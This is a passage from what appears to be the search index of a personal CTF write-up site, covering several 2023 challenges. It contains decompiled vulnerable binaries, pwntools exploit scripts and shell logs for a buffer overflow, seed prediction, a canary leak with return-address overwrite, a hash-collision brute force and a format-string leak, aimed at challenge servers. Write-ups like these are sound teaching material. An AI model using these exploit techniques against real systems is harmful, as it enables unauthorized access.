observing the binary for a long time, it happened to me that we should look at the process memory and look for our flag. I used GameGuardian to check the memory of sl4ydroid process in my android phone which by the way has root enabled. To get the flag, I followed the following process:</p> <p> </p> <p>flag: <code>flag{RizZZ! Rc4_R3v3r51Ngg_RrR!:}</code></p>","tags":["backdoorCTF","rev"]},{"location":"writeups/2023/backdoor/index.html#cheat-code","title":"Cheat Code","text":"<p>We were given a binary which was very easy to reverse using ghidra. The binary asks for some input (cheat) and then does some xor and conditional check. The conditions were pretty easy to reverse. We also had some part of the flag in plain text. The below c code prints out the flag:</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n  char f16[16];\n  f16[0] = 'f';\n  f16[1] = 'l';\n  f16[2] = 'a';\n  f16[3] = 'g';\n  f16[4] = '{';\n  f16[5] = 'c';\n  f16[6] = '4';\n  f16[7] = 'n';\n  f16[8] = '\\'';\n  f16[9] = 't';\n  f16[10] = '_';\n  f16[11] = 'H';\n  f16[12] = 'E';\n  f16[13] = 'S';\n  f16[14] = 'O';\n  f16[15] = 'Y';\n  int key[16];\n  key[0] = 0x1b;\n  key[1] = 0x19;\n  key[2] = 0x51;\n  key[3] = 0x1e;\n  key[4] = 0x24;\n  key[5] = 0xd;\n  key[6] = 0;\n  key[7] = 0xd;\n  key[8] = 0x78;\n  key[9] = 0x41;\n  key[10] = 0x6e;\n  key[11] = 0x20;\n  key[12] = 0x72;\n  key[13] = 0xc;\n  key[14] = 2;\n  key[15] = 0x18;\n  printf(\"%s\", f16);\n  for (int i = 15; i &gt;= 0; i--) {\n    printf(\"%c\", key[i] ^ f16[i]);\n  }\n}\n</code></pre> <pre><code>backdoor/beg/cheat via C v13.2.1-gcc took 1m4s\n\u276f ./sol\nflag{c4n't_HESOYAM_7h15_c4n_y0u}\n</code></pre> <p>flag: <code>flag{c4n't_HESOYAM_7h15_c4n_y0u}</code></p>","tags":["backdoorCTF","rev"]},{"location":"writeups/2023/backdoor/index.html#marks","title":"Marks","text":"<p>We were given a binary file that is supposed to show us our marks given our name and roll. Let's load it up in ghidra:</p> <pre><code>undefined8 main(void)\n\n{\n  int r;\n  time_t tVar1;\n  long in_FS_OFFSET;\n  undefined name [32];\n  char buf [64];\n  int roll;\n  uint m;\n  long local_10;\n\n  local_10 = *(in_FS_OFFSET + 0x28);\n  tVar1 = time(0x0);\n  srand(tVar1);\n  puts(\"Enter your details to view your marks ...\");\n  printf(\"Roll Number : \");\n  __isoc99_scanf(\"%d\",&amp;roll);\n  printf(\"Name : \");\n  __isoc99_scanf(\"%s\",name);\n  puts(\"Please Wait ...\\n\");\n  usleep(1000000);\n  r = rand();\n  m = r % 75;\n  printf(\"You got %d marks out of 100\\n\",m);\n  puts(\"Any Comments ?\");\n  __isoc99_scanf(\"%s\",buf);\n  puts(\"Thanks !\");\n  if (m == 100) {\n    puts(\"Cool ! Here is your shell !\");\n    system(\"/bin/sh\");\n  }\n  else {\n    puts(\"Next time get 100/100 marks for shell :)\");\n  }\n  if (local_10 != *(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_chk_fail();\n  }\n  return 0;\n}\n</code></pre> <p>The goal here is to get 100 marks but as we can see, the highest we can get is 74. So, we have to overflow our comment buffer into the m variable in our stack. Once you get where our m variable is in the stack, it is pretty easy to write an exploit that will overflow our buf buffer into the marks m variable. Here is my solution:</p> <pre><code>#!/usr/bin/env python\n\nfrom pwn import *\n\ncontext.log_level = \"debug\"\n\n# p = process(\"./chal\")\np = remote(\"34.70.212.151\", 8004)\n\np.recv()\np.sendline(b\"123\")\np.recv()\np.sendline(b\"whoami\")\np.recv()\npay = b\"a\" * 68 + p64(100)\np.sendline(pay)\np.interactive()\np.close()\n</code></pre> <pre><code>backdoor/beginner/marks on \ue0a0 master [!?] via \ud83d\udc0d v3.11.6\n\u276f ./sol.py\n[+] Starting local process './chal' argv=[b'./chal'] : pid 118111\n[DEBUG] Received 0x38 bytes:\n    b'Enter your details to view your marks ...\\n'\n    b'Roll Number : '\n[DEBUG] Sent 0x4 bytes:\n    b'123\\n'\n[DEBUG] Received 0x7 bytes:\n    b'Name : '\n[DEBUG] Sent 0x7 bytes:\n    b'whoami\\n'\n[DEBUG] Received 0x11 bytes:\n    b'Please Wait ...\\n'\n    b'\\n'\n[DEBUG] Sent 0x4d bytes:\n    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  \u2502aaaa\u2502aaaa\u2502aaaa\u2502aaaa\u2502\n    *\n    00000040  61 61 61 61  64 00 00 00  00 00 00 00  0a           \u2502aaaa\u2502d\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u2502\n    0000004d\n[*] Switching to interactive mode\n[DEBUG] Received 0x50 bytes:\n    b'You got 21 marks out of 100\\n'\n    b'Any Comments ?\\n'\n    b'Thanks !\\n'\n    b'Cool ! Here is your shell !\\n'\nYou got 21 marks out of 100\nAny Comments ?\nThanks !\nCool ! Here is your shell !\n$ ls\n[DEBUG] Sent 0x3 bytes:\n    b'ls\\n'\n[DEBUG] Received 0x16 bytes:\n    b'chal  flag.txt\\n'\nchal  flag.txt\n$ cat flag.txt\n[DEBUG] Sent 0xd bytes:\n    b'cat flag.txt\\n'\n[DEBUG] Received 0x25 bytes:\n    b'flag{Y0u_ju57_0v3rfl0wed_y0ur_m4rk5}\\n'\nflag{Y0u_ju57_0v3rfl0wed_y0ur_m4rk5}\n</code></pre> <p>flag: <code>flag{Y0u_ju57_0v3rfl0wed_y0ur_m4rk5}</code></p>","tags":["backdoorCTF","rev"]},{"location":"writeups/2023/backdoor/index.html#fruit-basket","title":"Fruit basket","text":"<p>We were given a binary. The binary when run, asks us to guess a fruit in it's basket.</p> <pre><code>backdoor/beginner/fruit_basket on \ue0a0 master [!?] via \ud83d\udc0d v3.11.6\n\u276f ./chal\nThere is a basket full of fruits, guess the fruit which I am holding ...\nThis seems hard, so I will give an awesome reward, something like a shell if you guess all the fruits right :)\n\nThe game starts now !\n1\nYour guess : mango\nOops ! Wrong Guess ..\nNo shell for you :(\n</code></pre> <p>Let's look inside the binary with ghidra.</p> <pre><code>/* DISPLAY WARNING: Type casts are NOT being printed */\n\nundefined8 main(void)\n\n{\n  int r;\n  time_t tVar1;\n  size_t len;\n  long in_FS_OFFSET;\n  int i;\n  char buf [12];\n  long canary;\n  char *fruit;\n  bool shell;\n\n  canary = *(in_FS_OFFSET + 0x28);\n  tVar1 = time(0x0);\n  srand(tVar1);\n  shell = true;\n  puts(\"There is a basket full of fruits, guess the fruit which I am holding ...\");\n  puts(\n      \"This seems hard, so I will give an awesome reward, something like a shell if you guess all th e fruits right :)\"\n      );\n  usleep(2000000);\n  puts(\"\\nThe game starts now !\");\n  i = 0;\n  do {\n    if (49 &lt; i) {\nLAB_001014ca:\n      if (shell) {\n        system(\"/bin/sh\");\n      }\n      if (canary != *(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n        __stack_chk_fail();\n      }\n      return 0;\n    }\n    r = rand();\n    fruit = fruits[r % 10];\n    printf(\"%d\\n\",i + 1);\n    printf(\"Your guess : \");\n    fgets(buf,12,stdin);\n    len = strcspn(buf,\"\\n\");\n    buf[len] = '\\0';\n    len = strlen(fruit);\n    r = strncmp(fruit,buf,len);\n    if (r != 0) {\n      puts(\"Oops ! Wrong Guess ..\");\n      puts(\"No shell for you :(\");\n      shell = false;\n      goto LAB_001014ca;\n    }\n    puts(\"Correct !\");\n    puts(\"\");\n    i += 1;\n  } while( true );\n}\n</code></pre> <p>The <code>fruits</code> is a global variable stored directly inside the binary which is a two dimensional array that is a list of fruits.</p> <pre><code>00102008    Apple\n0010200e    Orange\n00102015    Mango\n0010201b    Banana\n00102022    Pineapple\n0010202c    Watermelon\n00102037    Guava\n0010203d    Kiwi\n00102042    Strawberry\n0010204d    Peach\n</code></pre> <p>We have to guess all 50 fruits right. There seems to be no way of doing a buffer overflow or format string exploit in this code. So we target the seed that is being used to generate all random numbers. If we can use same seed to start our rng, we will arrive at the same random number. But the seed they are using is the system time using <code>seed(time(0))</code>. At first I thought well no luck here. But, if we think about it, if both us and the server starts at the same time, we will get the same time and eventually the same seed. The cstdlib <code>time(0)</code> returns time int the second resolution. So, we can use the fact that there is not much delay in between our communication, we can basically get the server and our rng to start with the same seed. The following code shows how we can call the cstdlib functions from within python with ctypes and write an exploit to get shell.</p> <pre><code>#!/usr/bin/env python\n\nfrom ctypes import CDLL\n\nfrom pwn import remote, gdb, context, log, p64, process, u64\n\ncontext.log_level = \"debug\"\ncontext.terminal = [\"tmux\", \"split-window\", \"-h\"]\n\nfruits = b\"\\x08\\x20\\x10\\x00\\x00\\x00\\x00\\x00\\x0e\\x20\\x10\\x00\\x00\\x00\\x00\\x00\\x15\\x20\\x10\\x00\\x00\\x00\\x00\\x00\\x1b\\x20\\x10\\x00\\x00\\x00\\x00\\x00\\x22\\x20\\x10\\x00\\x00\\x00\\x00\\x00\\x2c\\x20\\x10\\x00\\x00\\x00\\x00\\x00\\x37\\x20\\x10\\x00\\x00\\x00\\x00\\x00\\x3d\\x20\\x10\\x00\\x00\\x00\\x00\\x00\\x42\\x20\\x10\\x00\\x00\\x00\\x00\\x00\\x4d\\x20\\x10\\x00\\x00\\x00\\x00\\x00\"\nfruits = [u64(fruits[i : i + 8]) for i in range(0, len(fruits), 8)]\n\nfruit_basket = {\n    0x00102008: b\"Apple\",\n    0x0010200E: b\"Orange\",\n    0x00102015: b\"Mango\",\n    0x0010201B: b\"Banana\",\n    0x00102022: b\"Pineapple\",\n    0x0010202C: b\"Watermelon\",\n    0x00102037: b\"Guava\",\n    0x0010203D: b\"Kiwi\",\n    0x00102042: b\"Strawberry\",\n    0x0010204D: b\"Peach\",\n}\n\nlibc = CDLL(\"libc.so.6\")\n# p = process(\"./chal\")\np = remote(\"34.70.212.151\", 8006)\nseed = libc.time(0)\nlibc.srand(seed)\nlog.info(f\"using {seed=}\")\n\n# gdb.attach(\n#     p,\n#     \"\"\"\n#     set follow-fork-mode child\n#     break *(main+318)\n#     continue\n#     \"\"\",\n# )\n\nfor i in range(50):\n    rin = libc.rand() % len(fruits)\n    fruit = fruit_basket[fruits[rin]]\n    log.info(f\"rand = {rin}, fruit = {fruit}\")\n    try:\n        p.sendlineafter(b\"Your guess : \", fruit)\n    except:  # noqa: E722\n        break\n\np.interactive()\n</code></pre> <pre><code>backdoor/beginner/fruit_basket on \ue0a0 master [!?] via \ud83d\udc0d v3.11.6\n\u276f ./sol.py\n[+] Starting local process './chal' argv=[b'./chal'] : pid 128256\n[*] using seed=1703526848\n[*] rand = 7, fruit = b'Kiwi'\n[DEBUG] Received 0xb8 bytes:\n    b'There is a basket full of fruits, guess the fruit which I am holding ...\\n'\n    b'This seems hard, so I will give an awesome reward, something like a shell if you guess all the fruits right :)\\n'\n[DEBUG] Received 0x26 bytes:\n    b'\\n'\n    b'The game starts now !\\n'\n    b'1\\n'\n    b'Your guess : '\n[DEBUG] Sent 0x5 bytes:\n    b'Kiwi\\n'\n[*] rand = 2, fruit = b'Mango'\n[DEBUG] Received 0x1a bytes:\n    b'Correct !\\n'\n    b'\\n'\n    b'2\\n'\n    b'Your guess : '\n[DEBUG] Sent 0x6 bytes:\n    b'Mango\\n'\n[*] rand = 7, fruit = b'Kiwi'\n[DEBUG] Received 0x1a bytes:\n    b'Correct !\\n'\n    .\n    .\n    .\n    .\n    b'\\n'\n    b'49\\n'\n    b'Your guess : '\n[DEBUG] Sent 0xb bytes:\n    b'Strawberry\\n'\n[*] rand = 7, fruit = b'Kiwi'\n[DEBUG] Received 0x1b bytes:\n    b'Correct !\\n'\n    b'\\n'\n    b'50\\n'\n    b'Your guess : '\n[DEBUG] Sent 0x5 bytes:\n    b'Kiwi\\n'\n[*] Switching to interactive mode\n[DEBUG] Received 0xb bytes:\n    b'Correct !\\n'\n    b'\\n'\nCorrect !\n\n$ ls\n[DEBUG] Sent 0x3 bytes:\n    b'ls\\n'\n[DEBUG] Received 0x16 bytes:\n    b'chal  flag.txt\\n'\nchal  flag.txt\n$ cat flag.txt\n[DEBUG] Sent 0xd bytes:\n    b'cat flag.txt\\n'\n[DEBUG] Received 0x22 bytes:\n    b'flag{fru17s_w3r3nt_r4nd0m_4t_a11}\\n'\nflag{fru17s_w3r3nt_r4nd0m_4t_a11}\n</code></pre> <p>flag: <code>flag{fru17s_w3r3nt_r4nd0m_4t_a11}</code></p>","tags":["backdoorCTF","rev"]},{"location":"writeups/2023/backdoor/index.html#escape-the-room","title":"Escape the Room","text":"<p>We were given a binary. It asks for a key and also lets us try for a second chance.</p> <pre><code>backdoor/beginner/escape_the_room on \ue0a0 master [!?] via \ud83d\udc0d v3.11.6\n\u276f ./chal\nWelcome to Escape the R00m !\nYou have only two chances to escape the room ...\nEnter key : key\nkey\n is not the key, try again !\nEnter key : key\nWrong, go away !\n</code></pre> <p>The first input is a little suspicious. We can see that our input is being reflected. Maybe there is a format string vulnerability in the binary? Let's load it in ghidra.</p> <pre><code>void escape(void)\n\n{\n  puts(\"Sweet !\");\n  system(\"/bin/sh\");\n  return;\n}\n\n\nundefined8 main(void)\n\n{\n  int iVar1;\n  time_t tVar2;\n  long in_FS_OFFSET;\n  char inp [32];\n  char rstr [40];\n  long canary;\n\n  canary = *(in_FS_OFFSET + 0x28);\n  tVar2 = time(0x0);\n  srand(tVar2);\n  rand_str(rstr,30);\n  puts(\"Welcome to Escape the R00m !\");\n  puts(\"You have only two chances to escape the room ...\");\n  printf(\"Enter key : \");\n  read(0,inp,80);\n  iVar1 = strncmp(rstr,inp,30);\n  if (iVar1 == 0) {\n    puts(\"That was a nice escape ... But there is more to it !\");\n  }\n  else {\n    printf(\"%s is not the key, try again !\\n\",inp);\n  }\n  printf(\"Enter key : \");\n  __isoc99_scanf(\"%s\",inp);\n  iVar1 = strncmp(rstr,inp,0x1e);\n  if (iVar1 == 0) {\n    puts(\"That was a nice escape ... But there is more to it !\");\n  }\n  else {\n    puts(\"Wrong, go away !\");\n  }\n  if (canary != *(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_chk_fail();\n  }\n  return 0;\n}\n</code></pre> <p>As we can see from this code, even if we do generate the correct key using the strategy from the fruit_basket challenge to hack the seed, not only it does not give us shell nor does it leak any data. We can see that the buffer being read in the first try is 80. So, we can overflow our input buffer and overwrite our randomly generated string to be the same as our input. But making our guess right with an overflow does not help us either. Instead, if we make a wrong guess, we are given our input. We can see that the input is not being null terminated after being read. So, we can leak the canary by writing our buffer all the way up to our canary but also make the two strings that will be compared not equal. Because we want that leak. Then we will use the second input to overflow and write to the return address the address of our escape function.</p> <p>Here is the python script for the solution:</p> <pre><code>#!/usr/bin/env python\n\nfrom pwn import ELF, ROP, context, log, p64, process, remote\n\ncontext.log_level = \"debug\"\ncontext.terminal = [\"tmux\", \"split-window\", \"-h\"]\n\nelf = ELF(\"./chal\")\n\n# p = process(elf.path)\np = remote(\"34.70.212.151\", 8005)\n\nr = ROP(elf)\n\nret = r.find_gadget([\"ret\"])[0]\nescape = elf.symbols[\"escape\"]\n\n# gdb.attach(\n#     p,\n#     \"\"\"\n#     set follow-fork-mode child\n#     break 0x00401564\n#     continue\n#     \"\"\",\n# )\n\npayload = b\"A\" * 32\npayload += b\"B\" * 40\n\np.sendlineafter(b\"Enter key : \", payload)\np.recvline()\ncanary = b\"\\x00\" + p.recvline().strip()[:7]\nlog.info(f\"canary: {canary}\")\npayload = payload + canary + p64(ret) + p64(0x00401596)\n\np.sendlineafter(b\"Enter key : \", payload)\n# p.recv()\np.interactive()\n</code></pre> <p>Note: I could not get the script to work if we wanted to return to escape function. But I ended up returning to just before the shell is being called with system function inside the escape function. Also note that I could do it because PIE was disabled and I could jump to any address directly.</p> <pre><code>backdoor/beginner/escape_the_room on \ue0a0 master [!?] via \ud83d\udc0d v3.11.6\n\u276f ./sol.py\n[*] '/home/groot/dev/gr007-40.github.io/docs/writeups/2023/backdoor/beginner/escape_the_room/chal'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n[+] Starting local process '/home/groot/dev/gr007-40.github.io/docs/writeups/2023/backdoor/beginner/escape_the_room/chal' argv=[b'/home/groot/dev/gr007-40.github.io/docs/writeups/2023/backdoor/beginner/escape_the_room/chal'] : pid 142126\n[*] Loaded 5 cached gadgets for './chal'\n[DEBUG] Received 0x5a bytes:\n    b'Welcome to Escape the R00m !\\n'\n    b'You have only two chances to escape the room ...\\n'\n    b'Enter key : '\n[DEBUG] Sent 0x49 bytes:\n    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\\n'\n[DEBUG] Received 0x7a bytes:\n    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  \u2502AAAA\u2502AAAA\u2502AAAA\u2502AAAA\u2502\n    *\n    00000020  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  \u2502BBBB\u2502BBBB\u2502BBBB\u2502BBBB\u2502\n    *\n    00000040  42 42 42 42  42 42 42 42  0a 36 4e c6  3d 16 d2 43  \u2502BBBB\u2502BBBB\u2502\u00b76N\u00b7\u2502=\u00b7\u00b7C\u2502\n    00000050  01 20 69 73  20 6e 6f 74  20 74 68 65  20 6b 65 79  \u2502\u00b7 is\u2502 not\u2502 the\u2502 key\u2502\n    00000060  2c 20 74 72  79 20 61 67  61 69 6e 20  21 0a 45 6e  \u2502, tr\u2502y ag\u2502ain \u2502!\u00b7En\u2502\n    00000070  74 65 72 20  6b 65 79 20  3a 20                     \u2502ter \u2502key \u2502: \u2502\n    0000007a\n[*] canary: b'\\x006N\\xc6=\\x16\\xd2C'\n[DEBUG] Sent 0x61 bytes:\n    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  \u2502AAAA\u2502AAAA\u2502AAAA\u2502AAAA\u2502\n    *\n    00000020  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  \u2502BBBB\u2502BBBB\u2502BBBB\u2502BBBB\u2502\n    *\n    00000040  42 42 42 42  42 42 42 42  00 36 4e c6  3d 16 d2 43  \u2502BBBB\u2502BBBB\u2502\u00b76N\u00b7\u2502=\u00b7\u00b7C\u2502\n    00000050  1a 10 40 00  00 00 00 00  96 15 40 00  00 00 00 00  \u2502\u00b7\u00b7@\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7@\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\n    00000060  0a                                                  \u2502\u00b7\u2502\n    00000061\n[*] Switching to interactive mode\n[DEBUG] Received 0x11 bytes:\n    b'Wrong, go away !\\n'\nWrong, go away !\n$ ls\n[DEBUG] Sent 0x3 bytes:\n    b'ls\\n'\n[DEBUG] Received 0x16 bytes:\n    b'chal  flag.txt\\n'\nchal  flag.txt\n$ cat flag.txt\n[DEBUG] Sent 0xd bytes:\n    b'cat flag.txt\\n'\n[DEBUG] Received 0x3e bytes:\n    b'flag{unl0ck_y0ur_1m4gin4ti0ns_esc4p3_th3_r00m_0f_l1m1t4t10n5}\\n'\nflag{unl0ck_y0ur_1m4gin4ti0ns_esc4p3_th3_r00m_0f_l1m1t4t10n5}\n</code></pre> <p>flag: <code>flag{unl0ck_y0ur_1m4gin4ti0ns_esc4p3_th3_r00m_0f_l1m1t4t10n5}</code></p>","tags":["backdoorCTF","rev"]},{"location":"writeups/2023/bcactf/index.html","title":"bcactf 2023","text":"","tags":["bcactf","rev","crypto","web","blockchain"]},{"location":"writeups/2023/bcactf/index.html#git-better","title":"Git Better","text":"<p>points: 200</p>","tags":["bcactf","rev","crypto","web","blockchain"]},{"location":"writeups/2023/bcactf/index.html#description","title":"Description","text":"<p>We at BCACTF aspire to be unique. ~me That's why we decided to use our own \u2728proprietary\u2728 VCS for this year's challenges. It's a new and more efficient1 way to manage challenge versions, using The Blockchain\u2122.</p> <p>If you're a cryptocurrency person though, this chain of blocks may disappoint you. But we here at BCACTF aspire to be unique, (see above,) and so we will do what we want and NOT what the users want.</p> <p>Either way, we have a bit of an embarrassing situation on our hands. We just built our new flag validator, and in the process of copying the repository to the production server, we ran into a little issue... and lost one of our blocks.</p> <p>So would you uh... be willing to copy that over? I'm on vacation, and you seem to be a part of the new workplace family, so I'm sure you'd be happy to help us out, right?</p> <p>So would you be willing to copy over this block archive to the server? If you do that, I'd even give you \u2728exclusive\u2728 access to the proprietary repository protocols.</p> <p>Just please don't tamper with it, okay? Actually, I don't trust you. Blockchains are immutable for security purposes.</p> <p>Now go get that second block in, okay?</p> <p>Author: skysky</p>","tags":["bcactf","rev","crypto","web","blockchain"]},{"location":"writeups/2023/bcactf/index.html#resources","title":"Resources","text":"<p>challs.bcactf.com:31499</p> <p>git_better.tar.gz</p> <p>lost_block.txt</p>","tags":["bcactf","rev","crypto","web","blockchain"]},{"location":"writeups/2023/bcactf/index.html#solution","title":"Solution","text":"<p>The challange takes us to a webpage that looks like this:</p> <p></p> <p>As we can see, we were given a portal so that we can submit the block that was lost. We were also given the lost block. This is the output when we submit the lost block.</p> <p></p> <p>Now let's try to understand what the server does.</p> <p>We were given a tarball of the server:</p> <pre><code>chall_tar/\n\u251c\u2500\u2500 base\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 block.ts\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 hashing.ts\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 repository.ts\n\u2514\u2500\u2500 server\n    \u251c\u2500\u2500 index.html\n    \u2514\u2500\u2500 index.ts\n</code></pre> <p>The basic functionality of the html is as follows:</p> <pre><code>&lt;div class=\"main\"&gt;\n    &lt;h1&gt;We appreciate your help and cooperation&lt;/h1&gt;\n    &lt;h3&gt;Enter the block here&lt;/h3&gt;\n    &lt;textarea id=\"block-input\" class=\"input\"&gt;&lt;/textarea&gt;\n    &lt;button onmousedown=\"requestResponse()\" class=\"submit-button\"&gt;Submit&lt;/button&gt;\n    &lt;div id=\"output\" class=\"output-area\" /&gt;\n&lt;/div&gt;\n</code></pre> <p>As we can see the page takes <code>block-input</code> as input and sends to the server.</p> <p>There are many things going on in the server side for handling the post request as we can see from this part of <code>server.ts</code> file.</p> <pre><code>server.post(\n    \"/submit\",\n    async (req, res) =&gt; {\n        const body = req.body;\n        if (typeof body !== \"string\") {\n            res.status(400).send(\"Bad Body\");\n            return;\n        }\n        console.log(\"Submit req recieved with body:\", body.slice(0, 1024));\n\n        const buffer = Buffer.from(body);\n        const block = bufToBlock(buffer);\n\n        if (!block) {\n            res.status(400).send(\"Malformed Block\");\n            return;\n        }\n\n        const repo = fromBlocks([\n            bufToBlock(Buffer.from(recievedBlocks[0][1]))!,\n            block,\n            bufToBlock(Buffer.from(recievedBlocks[1][1]))!,\n            bufToBlock(Buffer.from(recievedBlocks[2][1]))!,\n        ]);\n\n        const output = build(repo);\n        if (!output) {\n            res.status(400).send(\"Corruption or tampering detected...\\n\\nHOW DARE YOUUUUU..........\");\n            return;\n        }\n\n        const controller = spawn(\"deno\", [\"run\", \"--allow-read=./flag.txt\", \"-\"]);\n\n        controller.stdin.write(output.toString(\"ascii\") + \"\\n\");\n        controller.stdin.end();\n\n        controller.stderr.pipe(process.stderr, { end: false });\n\n        res.write(\"Output:\\n\");\n        controller.stdout.pipe(res);\n    }\n\n)\n</code></pre> <p>The server follows the following algorithm:</p> <ul> <li>Recieve the post input from the request as a buffer.</li> <li>Create a block out of it.</li> <li>Create a repository from the blocks and the input block as the second block.     &gt; We also see a predifined array of blocks named <code>recievedBlocks</code> of size 3.     &gt; These are the blocks that the server already has and the lost block is the one that they lost.</li> <li>Build the repo.</li> <li>Run the repo as a deno script.     &gt; This script is supposedly their flag validator.</li> <li>Send the output of the script run as the response.</li> </ul> <p>The webpage loads the response into the bottom textbox where we see the output for providing the lost block is <code>Flag Matches</code>. So the flag validator works as expected for the right input.</p> <p>Let's see if it can detect if we corrupted the lost block.</p> <p></p> <p>As we can see, it can indeed detect if we corrupted the lost block.</p> <p>Let's understand how the <code>build(repo)</code> function works.</p> <pre><code>export const build = (repo: Repository): Buffer | null =&gt; {\n    const listOfBlocksToExecute = [];\n    let currBlock = repo.mostRecent;\n\n    while (currBlock !== 0n) {\n        const data = repo.blocks.get(currBlock);\n        if (!data) return null;\n\n        const block = bufToBlock(Buffer.from(data));\n        if (!block) return null;\n\n        listOfBlocksToExecute.unshift(block);\n        currBlock = block.prevHash;\n    }\n\n    const array = listOfBlocksToExecute.reduce((curr, block) =&gt; execBlock(curr, block), [] as number[]);\n\n    return Buffer.from(array);\n};\n</code></pre> <p>The function takes in a <code>Repository</code> type as a parameter and returns an array buffer after executing all the blocks. So, the blocks are units of execution and repository is a collection of blocks.</p> <p>The <code>Repository</code> is defined like below:</p> <pre><code>interface Repository {\n    blocks: Map&lt;bigint, string&gt;;\n    mostRecent: bigint;\n}\n</code></pre> <p>The collection of blocks is a map that maps a bigint to a string. The bigint being the hash of the string i.e. the block buffer. <code>mostRecent</code> is a tracker to the most recent block recieved. We can see in the build function that a list of blocks to execute is being made with the most recent block as the first block. Also, each block contains a hash of the previous block which is used to create the list.</p> <p>Now let's see how a block is defined.</p> <pre><code>export interface Block {\n    prevHash: bigint;\n    changes: Change[];\n}\n</code></pre> <p>Also let's see how a change is defined.</p> <pre><code>export interface Change {\n    index: number;\n    remove: number;\n    insert: Uint8Array;\n}\n</code></pre> <p>After seeing a conversion from block to buffer or buffer to block function, it becomes clear how a string is converted to a block and verified.</p> <p>The server uses a custom hash function to generate a hash for the blocks. the custom hash function is as follows:</p> <pre><code>export let modPrime = 261557n;\nexport let powerPrime = 1933n;\n\nexport const setSpecialPrime = (n: bigint) =&gt; modPrime = n;\nexport const setPowerPrime = (n: bigint) =&gt; powerPrime = n;\n\n\nconst myHashFunction = (data: Buffer) =&gt; {\n    let currentHash: bigint = 0n;\n\n    for (let i = 0n; i &lt; data.byteLength; i++) {\n        const byte = data[Number(i)];\n\n        currentHash ^= (powerPrime ** BigInt(byte) * i) % modPrime;\n    }\n\n    return currentHash;\n};\n\nexport default myHashFunction;\n</code></pre> <p>We can see that the <code>modPrime</code> despite being a bigint is actually a very small number. So the <code>myHashFunction</code> is vulnerable to simple brute-force attack. Now we know we can modify the <code>lost_block</code> and can still get the script to execute.</p> <p>But before all that, as we now have the full understanding of how everything works, let's build the original flag checker repo from the right blocks.</p> <pre><code>import {readFileSync as readFile} from 'node:fs';\n\nconst filePath = \"./flag.txt\";\n// Actually read the flag file.\nconst fileData = readFile(filePath, \"utf8\");\n\n// Fixed the mismatched bracket issue.\nconst flagValidatorRegex = /bcactf\\\\{[a-zA-Z0-9_\\\\-]\\\\}/;\n\nif (fileData.trim().match(flagValidatorRegex)) {\n    console.log(\"Flag Matches\");\n} else {\n    console.log(\"Flag does NOT match :(\");\n    console.log(\"Flag:\", fileData);\n}\n</code></pre> <p>So, We will only be able to get the flag if the flag does not match the regex. We can corrupt the regex as we can modify the lost_block.</p> <p>All we need to do now is to write a brute-force to create a block that will give the same hash.</p> <p>The following python function does the job:</p> <pre><code>#!/usr/bin/env python\n\nmod_prime = 261557\npower_prime = 1933\n\n\ndef my_hash_function(data):\n    current_hash = 0\n\n    for i in range(len(data)):\n        byte = ord(data[i])\n\n        current_hash ^= (power_prime ** byte * i) % mod_prime\n\n    return current_hash\n\n\nbuf = '0000000000000000000000000003a05b|2:[@7a-0+2(5c7d)][@47-0+27(2f2f20466978656420746865206d69736d61746368656420627261636b65742069737375652e0a)]'\nhash = my_hash_function(buf)\n\nfor i in range(0xffff):\n    new_buf = f'0000000000000000000000000003a05b|2:[@7a-0+2({hex(i)[2:]})][@47-0+27(2f2f20466978656420746865206d69736d61746368656420627261636b65742069737375652e0a)]'\n    new_hash = my_hash_function(new_buf)\n    if new_buf != buf and new_hash == hash:\n        buf = new_buf\n        print(new_buf)\n        print(new_hash)\n        exit()\n</code></pre> <p>The output:</p> <pre><code>0000000000000000000000000003a05b|2:[@7a-0+2(ac87)][@47-0+27(2f2f20466978656420746865206d69736d61746368656420627261636b65742069737375652e0a)]\n</code></pre> <p>Submit the block and get the flag</p> <p></p> <p>flag: <code>bcactf{app4r3ntly_y0u_5h0u1dn7_m4k3_y0ur_0wn_h45h_funct10n5}</code></p> <p>Note: <code>Git Even Better</code> uses a large prime as the modPrime. There is another way to get a hash collision but that has to do with cryptography. Apparantly the hashing algorithm is also vulnerable to some degree.</p>","tags":["bcactf","rev","crypto","web","blockchain"]},{"location":"writeups/2023/coderush/index.html","title":"Coderush 1.0","text":"","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#format_string-ftw","title":"format_string ftw","text":"","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#description","title":"Description","text":"<p>No one should see what I have in stack! Its only mine!</p> <p><code>nc 139.59.0.163 7777</code></p> <p>Author: <code>peace_ranger</code></p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#solution","title":"Solution","text":"<p>We are only given a connection information. we can connect to this via netcat. as this is a black box challenge where the clues are given in the challenge name and description, nothing else need to be said. The following exploit should work just fine:</p> <pre><code>#!/usr/bin/env python\n\nfrom pwn import *\n\n\nfor i in range(1,200):\n    p = remote(\"139.59.0.163\",7777)\n    x = f'%{i}$s'\n    p.recvline()\n    p.sendline(bytes(x,\"UTF-8\"))\n    print(p.recvline())\n</code></pre>","tags":["coderush","pwn","rev","format string vulnerability","integer 